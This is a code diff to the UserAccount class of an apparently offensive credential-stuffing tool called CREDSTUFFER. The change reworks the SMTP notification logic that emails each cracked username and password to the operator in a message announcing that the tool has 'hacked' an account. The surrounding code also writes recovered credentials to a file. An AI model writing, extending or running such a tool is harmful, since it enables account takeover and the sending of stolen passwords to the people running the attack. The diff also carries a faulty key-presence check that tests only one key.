@@ -27,10 +27,15 @@ class UserAccount(Account):
 
         if self.notify is not None:
             if 'mail' in self.notify:
-                if ('smtp' and 'port' and 'sender' and 'receiver' and 'password') in kwargs.keys():
-                    self.mail = Mail(smtp_server=kwargs.get('smtp'), port=kwargs.get('port'), sender=kwargs.get('sender'),
-                                     receiver=kwargs.get('receiver'))
-                    self.mail.login(username=kwargs.get('sender'), password=kwargs.get('password'))
+
+                if ( ('smtp' and 'port' and 'sender' and 'receiver' and 'password') in kwargs.keys() ) and \
+                        all([val is not None for val in kwargs.values()]):
+                    self.smtp = kwargs.get('smtp')
+                    self.port = kwargs.get('port')
+                    self.sender = kwargs.get('sender')
+                    self.password = kwargs.get('password')
+                    self.receiver = kwargs.get('receiver')
+                    self.mail = Mail(smtp_server=kwargs.get('smtp'), port=kwargs.get('port'))
         else:
             self.logger.info("No credential notification configured")
 
@@ -65,9 +70,10 @@ class UserAccount(Account):
             self.logger.error("Could not create credential file! Error: {}".format(e))
 
         if self.mail is not None:
+            self.mail.new_message()
             self.mail.set_subject("CREDSTUFFER: Credential Notification!")
             mail_content = "CREDSTUFFER has succesfully hacked credential from account {}\n\nUsername: {}\nPassword: {}"\
-                            .format(self.name, username, password)
+                           .format(self.name, username, password)
             self.mail.set_body(mail_content)
             self.logger.info("send credential mail: {}".format(mail_content))
-            self.mail.send()
+            self.mail.send(username=self.sender, password=self.password, receiver=self.receiver)
